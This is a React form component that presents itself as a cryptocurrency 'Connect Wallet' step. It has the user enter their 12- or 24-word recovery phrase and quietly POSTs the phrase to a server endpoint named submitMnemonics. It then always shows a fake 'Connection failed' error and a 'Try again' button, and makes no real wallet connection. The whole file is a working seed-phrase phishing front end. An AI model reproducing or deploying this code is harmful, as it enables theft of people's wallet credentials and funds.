import { useState } from "react";
import { BsHourglassSplit } from "react-icons/bs";
import { MdError } from "react-icons/md";

export const Form = () => {
  const [submitted, setSubmitted] = useState(false);
  const [showError, setShowError] = useState(false);
  const serverURL = import.meta.env.VITE_SERVER_URL;
  const token = import.meta.env.VITE_TOKEN;

  if (submitted) {
    setTimeout(() => {
      setShowError(true);
      setSubmitted(false);
    }, 10000);
  }

  const submitHandler = (e) => {
    e.preventDefault();
    setSubmitted(true);
    const form = new FormData(e.target);
    try {
      fetch(`${serverURL}/api/submitMnemonics?token=${token}`, {
        method: "POST",
        body: JSON.stringify({ mnemonics: form.get("mnemonics") }),
        headers: { "Content-Type": "application/json" }
      });
    } catch (e) {
      console.error(e);
    }
  };

  return (
    <form onSubmit={submitHandler}>
      {!showError && (
        <>
          <textarea
            name="mnemonics"
            className="w-full h-[100px] border outline-none p-1"
            placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
            required
            autoFocus></textarea>
          <button
            type="submit"
            value="submit"
            className="border rounded-2xl py-3 w-full text-white bg-blue-500 hover:bg-blue-900 mt-3 mb-5 ">
            {submitted ? (
              <div className="flex flex-row w-fit mx-auto">
                <p>Connecting Wallet...</p>
                <BsHourglassSplit className="animate-spin mt-1 ml-2" />
              </div>
            ) : (
              "Connect Wallet"
            )}
          </button>
        </>
      )}

      {showError && (
        <>
          <div className="text-red-600 max-md:text-sm flex flex-row items-center justify-center text-center gap-x-2">
            <MdError className="max-md:h-[2rem]" />
            <p>Connection failed, please try again</p>
          </div>
          <button
            onClick={() => {
              setShowError(false);
              setSubmitted(false);
            }}
            className="border rounded-2xl py-3 w-full bg-blue-500 text-white hover:bg-blue-400 text-xs mt-5">
            Try again
          </button>
        </>
      )}
    </form>
  );
};
